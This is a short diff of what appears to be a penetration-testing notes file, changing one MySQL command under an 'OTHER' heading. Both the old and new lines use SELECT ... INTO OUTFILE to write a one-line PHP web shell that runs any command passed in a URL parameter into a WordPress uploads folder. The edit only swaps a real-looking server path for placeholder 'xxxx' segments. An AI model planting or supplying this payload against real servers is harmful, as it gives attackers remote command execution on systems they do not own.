@@ -24,6 +24,6 @@ mysql> exit
 OTHER 
 =====
 
-mysql> Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";
+mysql> Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/xxxx/xxxx/wp-content/uploads/shell.php";
 
 
